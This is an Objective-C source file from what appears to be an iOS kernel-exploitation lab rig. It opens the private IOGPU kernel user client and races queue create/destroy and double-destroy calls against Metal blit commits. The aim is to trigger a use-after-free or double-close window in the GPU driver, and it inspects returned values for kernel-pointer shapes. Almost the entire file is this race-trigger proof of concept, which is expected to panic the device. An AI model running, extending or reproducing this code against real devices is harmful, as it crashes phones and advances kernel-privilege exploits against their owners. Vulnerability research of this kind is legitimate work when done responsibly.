//
//  P121IogpuCloseMerge.m — the iogpu_close REOPEN. p121. P007 rig.
//
//  Law (note 283): an intercept closes a TAP SHAPE, not a LANE. The old
//  "iogpu_close (XR sel)" tap stays STOP (sel=7-as-create was XR-wrong);
//  THIS build runs the CURRENT map: P040-ABI dest create (sel=6,
//  queueCreateSize) + destroy (sel=7) — which P040 proved on-device —
//  raced against the kernel's merge/completion machine (note 276's
//  IOGPUEventMachine merge-window candidate):
//
//    thread A: sel6 create → sel7 destroy ping-pong (close side)
//    thread B: Metal blit commits on a REAL command queue (the
//              completion/merge machine's driver side)
//
//  The reopen premise: the queue's destroy path tears slots down while
//  the merge/complete machine may still consume the same qid/queue
//  record — the close race = a fresh shape vs the XR-era sel confusion,
//  and = the p110 engine-drop field's sibling class.
//
//  BOUNDS: ≤64 destroy cycles / 10s; IN-FLIGHT stamp; one tap per
//  force-quit. PANIC-POSSIBLE.
//

#import "P121IogpuCloseMerge.h"
#import "LabDeviceProfile.h"
#import "LabIOGPUQueue.h"
#import "LabLocalTime.h"

#import <Metal/Metal.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>
#import <stdarg.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P121_BUILD  @"p121-closemerge-v1"
#define P121_TIME   10.0

typedef mach_port_t p_ioobject_t;
typedef p_ioobject_t p_ioservice_t;
typedef mach_port_t p_ioconnect_t;
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef p_ioservice_t (*IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*IOObjectRelease_t)(p_ioobject_t);
typedef kern_return_t (*IOServiceCS_t)(p_ioconnect_t);
typedef kern_return_t (*IOServiceOpen_t)(p_ioservice_t, task_port_t, uint32_t, p_ioconnect_t *);
typedef kern_return_t (*IOConnectCallMethod_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);
typedef void *(*DevCreate_t)(p_ioservice_t);
typedef uint32_t (*GetConn_t)(void *);
typedef void (*DevRelease_t)(void *);

static NSMutableString *g_buf;
static int g_fd = -1;
static IOConnectCallMethod_t gp_call;
static p_ioconnect_t g_conn;
static uint32_t g_ins, g_dsel, g_typeId;
static atomic_int g_stop;
static atomic_ulong g_cr_ok, g_dr_ok, g_cr_fail, g_dr_fail, g_extra_ok;
static id<MTLCommandQueue> g_mq;
static id<MTLBuffer> g_ab, g_bb;

static void L(NSString *s) {
    if (!g_buf) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { (void)write(g_fd, p, strlen(p)); (void)fcntl(g_fd, F_FULLFSYNC); }
    }
}
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

/* Thread A: the close side — create → destroy ping-pong (P040 ABI). */
static void *p121_closer(void *u) {
    (void)u;
    while (!atomic_load(&g_stop)) {
        uint64_t w0 = 0, w1 = 0; size_t osz = 16;
        kern_return_t cr = [LabIOGPUQueue createWithCall:gp_call conn:g_conn
                                                  typeId:g_typeId
                                                  inSize:g_ins word0:&w0 word1:&w1
                                                 outCnt:&osz];
        if (cr != 0) { atomic_fetch_add(&g_cr_fail, 1); usleep(200); continue; }
        atomic_fetch_add(&g_cr_ok, 1);
        uint32_t qid = (uint32_t)w0;
        uint64_t dsc = qid;
        kern_return_t dr = gp_call(g_conn, g_dsel, &dsc, 1, NULL, 0, NULL, NULL, NULL, NULL);
        if (dr == 0) atomic_fetch_add(&g_dr_ok, 1);
        else atomic_fetch_add(&g_dr_fail, 1);
        if (dr == 0) {
            /* The extra-destroy shape P040 observed (BadArgument = the
             * namespace close path fully consumed). A 0 here = the
             * double-close window. */
            kern_return_t dr2 = gp_call(g_conn, g_dsel, &dsc, 1, NULL, 0, NULL, NULL, NULL, NULL);
            if (dr2 == 0) atomic_fetch_add(&g_extra_ok, 1);
        }
        usleep(500);
    }
    return NULL;
}

/* Thread B: the merge/completion side — real Metal blit commits. */
static void *p121_blitter(void *u) {
    (void)u;
    NSUInteger Lsz = MIN(g_ab.length, g_bb.length);
    while (!atomic_load(&g_stop)) {
        @autoreleasepool {
            id<MTLCommandBuffer> cb = [g_mq commandBuffer];
            if (!cb) { usleep(1000); continue; }
            id<MTLBlitCommandEncoder> e = [cb blitCommandEncoder];
            [e copyFromBuffer:g_ab sourceOffset:0 toBuffer:g_bb destinationOffset:0 size:Lsz];
            [e endEncoding];
            [cb commit];
        }
        usleep(50);
    }
    return NULL;
}

@implementation P121IogpuCloseMerge

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p121_closemerge_log.txt"] UTF8String],
                O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p121 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P121_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] the iogpu_close REOPEN (note 283 #2) = a NEW build vs the");
    L(@"  CURRENT map: P040-ABI create(sel6)/destroy(sel7) raced against");
    L(@"  the merge/completion machine (note 276's IOGPUEventMachine");
    L(@"  merge-window candidate; the old XR sel-shape stays STOP).");
    L(@"[warn] PANIC-POSSIBLE — one tap per force-quit.");

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    IOServiceMatching_t pMatching = NULL;
    IOServiceGetMatchingService_t pGet = NULL;
    IOObjectRelease_t pRelease = NULL;
    IOServiceCS_t pSvcClose = NULL;
    IOConnectCallMethod_t pCall = NULL;
    DevCreate_t pDevCreate = NULL;
    GetConn_t pGetConn = NULL;
    DevRelease_t pDevRelease = NULL;
    mach_port_t *pMainPort = NULL;
    p_ioservice_t svc = 0;
    p_ioconnect_t conn = MACH_PORT_NULL;
    void *dev = NULL;
    uint32_t typeId = 0;
    pthread_t ta, tb;
    int ran_a = 0, ran_b = 0;
    id<MTLDevice> mdev = NULL;

    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) { L(@"[-] STOP dlopen"); goto done; }
    pMatching = dlsym(iokit, "IOServiceMatching");
    pGet = dlsym(iokit, "IOServiceGetMatchingService");
    pRelease = dlsym(iokit, "IOObjectRelease");
    pSvcClose = dlsym(iokit, "IOServiceClose");
    pCall = dlsym(iokit, "IOConnectCallMethod");
    pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    pGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    if (!pMatching || !pGet || !pRelease || !pCall || !pMainPort) {
        L(@"[-] STOP dlsym"); goto done;
    }

    svc = pGet(*pMainPort, pMatching("IOGPU"));
    if (!svc) { L(@"[-] STOP no IOGPU service"); goto done; }

    if (pDevCreate) dev = pDevCreate(svc);
    if (dev && pGetConn) conn = pGetConn(dev);
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    if (!conn || conn == MACH_PORT_NULL) {
        if (pOpen) {
            kern_return_t okr = pOpen(svc, mach_task_self(), 1, &conn);
            Lf(@"[*] IOServiceOpen type=1 kr=0x%08x", okr);
            if (okr != 0) conn = MACH_PORT_NULL;
        }
    }
    if (!conn || conn == MACH_PORT_NULL) {
        L(@"[-] STOP no conn"); pRelease(svc); goto done;
    }

    gp_call = pCall;
    g_conn = conn;
    g_ins = [LabDeviceProfile queueCreateSize];
    g_dsel = [LabDeviceProfile queueDestroySel];
    if (dev) typeId = *(uint32_t *)((uint8_t *)dev + 0x08) & 0xff;
    g_typeId = typeId;

    /* ---------- Stage 0: the P040-ABI calibrate on THIS device ---------- */
    L(@"");
    L(@"--- Stage 0: P040-ABI calibrate (create/destroy ×3) ---");
    {
        int ok0 = 1;
        for (int i = 0; i < 3; i++) {
            uint64_t w0 = 0, w1 = 0; size_t osz = 16;
            kern_return_t cr = [LabIOGPUQueue createWithCall:pCall conn:conn
                                                      typeId:typeId inSize:g_ins
                                                      word0:&w0 word1:&w1 outCnt:&osz];
            Lf(@"[0] create kr=0x%08x qid=0x%llx word1=0x%llx %s",
               (unsigned)cr, w0, w1,
               [LabIOGPUQueue wordLooksLikeKptr:w1] ? "KPTR-SHAPED" : "not-kptr");
            if (cr != 0) { ok0 = 0; break; }
            uint64_t dsc[] = { w0 };
            kern_return_t dr = pCall(conn, g_dsel, dsc, 1, NULL, 0, NULL, NULL, NULL, NULL);
            Lf(@"[0] destroy qid=%llu kr=0x%08x %s", (unsigned long long)w0,
               (unsigned)dr, [LabIOGPUQueue krName:dr]);
            if (dr != 0) { ok0 = 0; break; }
        }
        if (!ok0) {
            L(@"[-] STOP the dest ABI did not calibrate on this device —");
            L(@"  honest stop (the reopen needs the P040 laws live).");
        } else {
            L(@"[0] dest ABI calibrated on THIS device (the reopen's premise)");

            /* ---------- Stage 1: the close-vs-merge race ---------- */
            L(@"");
            Lf(@"--- Stage 1: close-vs-merge race (bounded %.0fs) ---", P121_TIME);
            L(@"[IN FLIGHT] stage-1 race begins — one tap per force-quit.");
            atomic_store(&g_stop, 0);
            g_mq = nil; g_ab = nil; g_bb = nil;
            mdev = MTLCreateSystemDefaultDevice();
            if (!mdev) {
                L(@"[-] no Metal device — stage-1 degrades to close-only");
            } else {
                g_mq = [mdev newCommandQueue];
                g_ab = [mdev newBufferWithLength:0x1000 options:MTLResourceStorageModeShared];
                g_bb = [mdev newBufferWithLength:0x1000 options:MTLResourceStorageModeShared];
                if (g_mq && g_ab && g_bb) {
                    memset(g_ab.contents, 0x41, 0x1000);
                    memset(g_bb.contents, 0x11, 0x1000);
                } else {
                    g_mq = nil;
                    L(@"[-] Metal queue/buffers missing — stage-1 close-only");
                }
            }
            ran_b = g_mq && (pthread_create(&tb, NULL, p121_blitter, NULL) == 0);
            ran_a = (pthread_create(&ta, NULL, p121_closer, NULL) == 0);
            if (!ran_a) {
                atomic_store(&g_stop, 1);
                L(@"[-] STOP pthread closer");
            } else {
                usleep((useconds_t)(P121_TIME * 1000000.0));
            }
            atomic_store(&g_stop, 1);
            if (ran_a) pthread_join(ta, NULL);
            if (ran_b) pthread_join(tb, NULL);

            Lf(@"[*] done: create_ok=%lu create_fail=%lu destroy_ok=%lu destroy_fail=%lu double_destroy_0=%lu",
               atomic_load(&g_cr_ok), atomic_load(&g_cr_fail),
               atomic_load(&g_dr_ok), atomic_load(&g_dr_fail), atomic_load(&g_extra_ok));

            L(@"");
            L(@"=== VERDICT (honest) ===");
            L(@"- survived cleanly = the destroy/namespace close path consumed every");
            L(@"  qid without a merge-window hit on this device; double_destroy_0 > 0");
            L(@"  = the double-close WINDOW exists (a shape, not a receipt).");
            L(@"- a Metal fault / device-lost during the race = the merge machine's");
            L(@"  completion path touched a mid-teardown queue = the WINDOW class.");
            L(@"- a panic = the kernel ate the inconsistent close = the note-276");
            L(@"  merge-window candidate ATTESTED (decode the ips to the fn).");
            L(@"hasKread=NO. No claims beyond the shapes above.");
        }
    }

    if (pSvcClose && conn) pSvcClose(conn);
    if (dev && pDevRelease) pDevRelease(dev);
    pRelease(svc);
done:
    if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
    NSString *ret = g_buf ?: @"(no p121 log)";
    g_buf = nil;
    return ret;
}

@end